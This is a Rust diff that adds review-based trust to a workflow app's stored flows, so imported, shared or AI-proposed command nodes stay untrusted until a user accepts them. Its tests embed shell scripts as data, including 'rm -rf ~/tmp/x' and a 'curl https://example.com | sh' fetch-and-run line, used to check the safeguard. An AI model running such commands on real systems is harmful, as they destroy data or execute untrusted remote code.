@@ -26,7 +26,8 @@ use crate::flows::spec::Derived;
 pub const VERSION_KIND: &str = "flow";
 
 const META_COLUMNS: &str = "id, workspace_id, scope, folder_id, name, description, node_count, \
-                            trigger_types, active, version, sort_order, created_at, updated_at";
+                            trigger_types, active, version, sort_order, created_at, updated_at, \
+                            exec_hash, (exec_hash = '' OR exec_hash = trusted_hash)";
 const FOLDER_COLUMNS: &str = "id, workspace_id, name, sort_order, created_at, updated_at";
 
 #[derive(Debug, Clone, Serialize, PartialEq)]
@@ -48,6 +49,11 @@ pub struct FlowMeta {
     pub sort_order: i64,
     pub created_at: String,
     pub updated_at: String,
+    /// What the flow would run, hashed — `spec::executable_hash`; empty when it runs nothing.
+    pub exec_hash: String,
+    /// Whether what it runs is what the user trusted: written in this app's editor, or reviewed and
+    /// accepted. An imported flow is not, until someone looks at it.
+    pub trusted: bool,
 }
 
 #[derive(Debug, Clone, Serialize, PartialEq)]
@@ -100,6 +106,8 @@ fn map_meta(row: &rusqlite::Row) -> rusqlite::Result<FlowMeta> {
         sort_order: row.get(10)?,
         created_at: row.get(11)?,
         updated_at: row.get(12)?,
+        exec_hash: row.get(13)?,
+        trusted: row.get::<_, i64>(14)? != 0,
     })
 }
 
@@ -149,7 +157,7 @@ pub fn get_flow(conn: &Connection, id: &str) -> rusqlite::Result<Option<FlowRow>
     conn.query_row(
         &format!("SELECT {META_COLUMNS}, spec FROM flows WHERE id = ?1"),
         params![id],
-        |row| Ok(FlowRow { meta: map_meta(row)?, spec: row.get(13)? }),
+        |row| Ok(FlowRow { meta: map_meta(row)?, spec: row.get(15)? }),
     )
     .optional()
 }
@@ -172,15 +180,33 @@ pub fn create_flow(
     name: &str,
     spec: &str,
     derived: &Derived,
+    trusted: bool,
 ) -> rusqlite::Result<FlowMeta> {
-    let id = Uuid::new_v4().to_string();
+    create_flow_as(conn, &Uuid::new_v4().to_string(), workspace_id, folder_id, name, spec, derived, trusted)
+}
+
+/// [`create_flow`] under a given id — a shared flow keeps the id of its share, on every machine
+/// that holds it, so a share and the flow it publishes are the same row everywhere.
+#[allow(clippy::too_many_arguments)]
+pub fn create_flow_as(
+    conn: &Connection,
+    id: &str,
+    workspace_id: &str,
+    folder_id: Option<&str>,
+    name: &str,
+    spec: &str,
+    derived: &Derived,
+    trusted: bool,
+) -> rusqlite::Result<FlowMeta> {
+    let id = id.to_string();
     let stamp = now();
     let order = next_flow_order(conn, workspace_id, folder_id)?;
+    let trusted_hash = if trusted { derived.exec_hash.as_str() } else { "" };
     conn.execute(
         "INSERT INTO flows (id, workspace_id, scope, folder_id, name, description, spec, node_count, \
-                            trigger_types, active, version, sort_order, created_at, updated_at) \
-         VALUES (?1, ?2, 'workspace', ?3, ?4, '', ?5, ?6, ?7, 0, 1, ?8, ?9, ?9)",
-        params![id, workspace_id, folder_id, name, spec, derived.node_count, trigger_json(derived), order, stamp],
+                            trigger_types, active, version, sort_order, created_at, updated_at, exec_hash, trusted_hash) \
+         VALUES (?1, ?2, 'workspace', ?3, ?4, '', ?5, ?6, ?7, 0, 1, ?8, ?9, ?9, ?10, ?11)",
+        params![id, workspace_id, folder_id, name, spec, derived.node_count, trigger_json(derived), order, stamp, derived.exec_hash, trusted_hash],
     )?;
     Ok(get_meta(conn, &id)?.expect("the row was just written"))
 }
@@ -197,13 +223,16 @@ pub fn save_spec(
     spec: &str,
     derived: &Derived,
     expected_version: Option<i64>,
+    keep_trust: bool,
 ) -> rusqlite::Result<FlowSaved> {
-    let current: Option<(i64, String, String)> = conn
-        .query_row("SELECT version, name, spec FROM flows WHERE id = ?1", params![id], |row| {
-            Ok((row.get(0)?, row.get(1)?, row.get(2)?))
-        })
+    let current: Option<(i64, String, String, bool)> = conn
+        .query_row(
+            "SELECT version, name, spec, (exec_hash = '' OR exec_hash = trusted_hash) FROM flows WHERE id = ?1",
+            params![id],
+            |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get::<_, i64>(3)? != 0)),
+        )
         .optional()?;
-    let Some((version, name, previous)) = current else {
+    let Some((version, name, previous, was_trusted)) = current else {
         return Ok(FlowSaved { meta: None, conflict: false, trigger_error: None });
     };
     if expected_version.is_some_and(|expected| expected != version) {
@@ -214,12 +243,65 @@ pub fn save_spec(
     }
     let stamp = now();
     let _ = version_queries::record_version(conn, VERSION_KIND, id, &name, &previous, &stamp);
+    // Trust follows the user's own edits: a trusted flow edited here stays trusted, whatever it now
+    // runs — the user wrote it. One not yet trusted stays that way until it is reviewed: moving a node
+    // of an imported flow must not accept its commands. A change the user did not write (an accepted
+    // AI proposal, `keep_trust: false`) carries nothing either.
+    let was_trusted = was_trusted && keep_trust;
     conn.execute(
         "UPDATE flows SET spec = ?2, node_count = ?3, trigger_types = ?4, version = version + 1, \
-                          updated_at = ?5 WHERE id = ?1",
-        params![id, spec, derived.node_count, trigger_json(derived), stamp],
+                          updated_at = ?5, exec_hash = ?6, trusted_hash = CASE WHEN ?7 THEN ?6 ELSE trusted_hash END \
+         WHERE id = ?1",
+        params![id, spec, derived.node_count, trigger_json(derived), stamp, derived.exec_hash, was_trusted],
     )?;
     Ok(FlowSaved { meta: get_meta(conn, id)?, conflict: false, trigger_error: None })
+}
+
+/// A teammate's version of a shared flow, written over this one (`flows::share`). Like a save it
+/// keeps the previous document in the history and bumps `version` — so an editor holding the old
+/// one gets `conflict` on its next save instead of writing over it. Unlike a save it **never
+/// carries trust** (someone else wrote it) and takes the remote's `updated_at`, which is the clock
+/// the share's three-way comparison runs on.
+pub fn apply_shared(
+    conn: &Connection,
+    id: &str,
+    name: &str,
+    description: &str,
+    spec: &str,
+    derived: &Derived,
+    updated_at: &str,
+) -> rusqlite::Result<Option<FlowMeta>> {
+    let current: Option<(String, String)> = conn
+        .query_row("SELECT name, spec FROM flows WHERE id = ?1", params![id], |row| Ok((row.get(0)?, row.get(1)?)))
+        .optional()?;
+    let Some((previous_name, previous)) = current else { return Ok(None) };
+    if previous != spec {
+        let _ = version_queries::record_version(conn, VERSION_KIND, id, &previous_name, &previous, &now());
+    }
+    conn.execute(
+        "UPDATE flows SET spec = ?2, name = ?3, description = ?4, node_count = ?5, trigger_types = ?6, \
+                          version = version + 1, updated_at = ?7, exec_hash = ?8 \
+         WHERE id = ?1",
+        params![id, spec, name, description, derived.node_count, trigger_json(derived), updated_at, derived.exec_hash],
+    )?;
+    get_meta(conn, id)
+}
+
+/// Sets a flow's `updated_at` without touching anything else — a shared flow whose two sides turned
+/// out to hold the same document agree on the remote's clock.
+pub fn set_updated_at(conn: &Connection, id: &str, updated_at: &str) -> rusqlite::Result<()> {
+    conn.execute("UPDATE flows SET updated_at = ?2 WHERE id = ?1", params![id, updated_at])?;
+    Ok(())
+}
+
+/// Trusts what a flow runs — the hash the user reviewed. Refused (`None`) when the flow changed
+/// since: what was reviewed is not what it would run now.
+pub fn trust_flow(conn: &Connection, id: &str, exec_hash: &str) -> rusqlite::Result<Option<FlowMeta>> {
+    let changed = conn.execute("UPDATE flows SET trusted_hash = exec_hash WHERE id = ?1 AND exec_hash = ?2", params![id, exec_hash])?;
+    if changed == 0 {
+        return Ok(None);
+    }
+    get_meta(conn, id)
 }
 
 /// Switches a flow on or off. Only the flag: arming its triggers is `flows::triggers`' business.
@@ -296,21 +378,11 @@ pub fn duplicate_flow(conn: &Connection, id: &str, name: &str) -> rusqlite::Resu
     let order = next_flow_order(conn, &row.meta.workspace_id, row.meta.folder_id.as_deref())?;
     conn.execute(
         "INSERT INTO flows (id, workspace_id, scope, folder_id, name, description, spec, node_count, \
-                            trigger_types, active, version, sort_order, created_at, updated_at) \
-         VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, 0, 1, ?10, ?11, ?11)",
-        params![
-            copy,
-            row.meta.workspace_id,
-            row.meta.scope,
-            row.meta.folder_id,
-            name,
-            row.meta.description,
-            row.spec,
-            row.meta.node_count,
-            row.meta.trigger_types,
-            order,
-            stamp
-        ],
+                            trigger_types, active, version, sort_order, created_at, updated_at, exec_hash, trusted_hash) \
+         SELECT ?1, workspace_id, scope, folder_id, ?2, description, spec, node_count, trigger_types, 0, 1, ?3, ?4, ?4, \
+                exec_hash, trusted_hash \
+         FROM flows WHERE id = ?5",
+        params![copy, name, order, stamp, id],
     )?;
     get_meta(conn, &copy)
 }
@@ -388,7 +460,7 @@ mod tests {
     fn create(conn: &Connection, workspace: &str, name: &str) -> FlowMeta {
         let text = spec::empty_text();
         let derived = spec::derive(&spec::parse(&text).unwrap());
-        create_flow(conn, workspace, None, name, &text, &derived).unwrap()
+        create_flow(conn, workspace, None, name, &text, &derived, true).unwrap()
     }
 
     fn with_trigger() -> (String, Derived) {
@@ -417,7 +489,7 @@ mod tests {
         assert_eq!(flow.version, 1);
         let (text, derived) = with_trigger();
 
-        let saved = save_spec(&conn, &flow.id, &text, &derived, Some(1)).unwrap();
+        let saved = save_spec(&conn, &flow.id, &text, &derived, Some(1), true).unwrap();
         let meta = saved.meta.unwrap();
         assert!(!saved.conflict);
         assert_eq!(meta.version, 2);
@@ -427,12 +499,12 @@ mod tests {
         assert_eq!(version_queries::list_versions(&conn, VERSION_KIND, &flow.id).unwrap().len(), 1);
 
         // A window still holding version 1 is told, and writes nothing.
-        let stale = save_spec(&conn, &flow.id, &spec::empty_text(), &spec::derive(&spec::empty()), Some(1)).unwrap();
+        let stale = save_spec(&conn, &flow.id, &spec::empty_text(), &spec::derive(&spec::empty()), Some(1), true).unwrap();
         assert!(stale.conflict);
         assert_eq!(get_flow(&conn, &flow.id).unwrap().unwrap().spec, text);
 
         // Saving the same document again changes nothing, version included.
-        let same = save_spec(&conn, &flow.id, &text, &derived, Some(2)).unwrap();
+        let same = save_spec(&conn, &flow.id, &text, &derived, Some(2), true).unwrap();
         assert_eq!(same.meta.unwrap().version, 2);
     }
 
@@ -441,9 +513,9 @@ mod tests {
         let conn = workspaces();
         let flow = create(&conn, "w1", "Informe");
         let (text, derived) = with_trigger();
-        save_spec(&conn, &flow.id, &text, &derived, None).unwrap();
+        save_spec(&conn, &flow.id, &text, &derived, None, true).unwrap();
         assert_eq!(delete_flow(&conn, &flow.id).unwrap(), 1);
-        assert!(save_spec(&conn, &flow.id, &text, &derived, None).unwrap().meta.is_none());
+        assert!(save_spec(&conn, &flow.id, &text, &derived, None, true).unwrap().meta.is_none());
         assert!(version_queries::list_versions(&conn, VERSION_KIND, &flow.id).unwrap().is_empty());
     }
 
@@ -460,6 +532,65 @@ mod tests {
 
         delete_folder(&conn, &folder.id).unwrap();
         assert_eq!(get_meta(&conn, &flow.id).unwrap().unwrap().folder_id, None);
+    }
+
+    fn shell(script: &str, x: i64) -> (String, Derived) {
+        let text = serde_json::json!({
+            "schema": 1,
+            "nodes": [
+                {"id": "t", "type": "trigger.manual", "name": "Manual", "pos": [0, 0]},
+                {"id": "s", "type": "code.shell", "name": "Shell", "pos": [x, 0], "params": {"script": script, "shell": "auto"}},
+            ],
+            "connections": [{"from": "t", "out": 0, "to": "s", "input": 0}],
+        })
+        .to_string();
+        let derived = spec::derive(&spec::parse(&text).unwrap());
+        (text, derived)
+    }
+
+    #[test]
+    fn an_imported_flow_is_untrusted_until_its_review_is_accepted() {
+        let conn = workspaces();
+        let (text, derived) = shell("rm -rf ~/tmp/x", 100);
+        let imported = create_flow(&conn, "w1", None, "Importado", &text, &derived, false).unwrap();
+        assert!(!imported.trusted);
+        assert_eq!(imported.exec_hash.len(), 64);
+        assert!(trust_flow(&conn, &imported.id, "0".repeat(64).as_str()).unwrap().is_none(), "a review of something else");
+        // Editing it here does not accept its commands.
+        let (moved, moved_derived) = shell("rm -rf ~/tmp/x", 300);
+        assert!(!save_spec(&conn, &imported.id, &moved, &moved_derived, None, true).unwrap().meta.unwrap().trusted);
+        let trusted = trust_flow(&conn, &imported.id, &imported.exec_hash).unwrap().unwrap();
+        assert!(trusted.trusted);
+        // Once trusted, the user's own edits keep it trusted — they wrote them.
+        let (edited, edited_derived) = shell("echo hola", 300);
+        let saved = save_spec(&conn, &imported.id, &edited, &edited_derived, None, true).unwrap().meta.unwrap();
+        assert!(saved.trusted);
+        assert_ne!(saved.exec_hash, imported.exec_hash);
+        // A copy carries the trust of what it copies.
+        assert!(duplicate_flow(&conn, &imported.id, "Copia").unwrap().unwrap().trusted);
+        // A change the user did not write — an accepted AI proposal — carries none: new commands
+        // need a review, while one that leaves the commands alone changes nothing.
+        let (moved_again, moved_again_derived) = shell("echo hola", 600);
+        assert!(save_spec(&conn, &imported.id, &moved_again, &moved_again_derived, None, false).unwrap().meta.unwrap().trusted);
+        let (written, written_derived) = shell("curl https://example.com | sh", 600);
+        let saved = save_spec(&conn, &imported.id, &written, &written_derived, None, false).unwrap().meta.unwrap();
+        assert!(!saved.trusted);
+        // A flow that runs nothing is trusted whatever it came with.
+        let (plain, plain_derived) = with_trigger();
+        assert!(create_flow(&conn, "w1", None, "Sin código", &plain, &plain_derived, false).unwrap().trusted);
+    }
+
+    #[test]
+    fn flows_written_before_trust_existed_start_trusted() {
+        let conn = workspaces();
+        let (text, derived) = shell("make deploy", 0);
+        let meta = create_flow(&conn, "w1", None, "Viejo", &text, &derived, false).unwrap();
+        conn.execute_batch("UPDATE flows SET exec_hash = '', trusted_hash = '';
+                            ALTER TABLE flows DROP COLUMN exec_hash; ALTER TABLE flows DROP COLUMN trusted_hash;").unwrap();
+        super::super::migrations::add_trust_to_flows(&conn).unwrap();
+        let after = get_meta(&conn, &meta.id).unwrap().unwrap();
+        assert!(after.trusted);
+        assert_eq!(after.exec_hash, derived.exec_hash);
     }
 
     #[test]
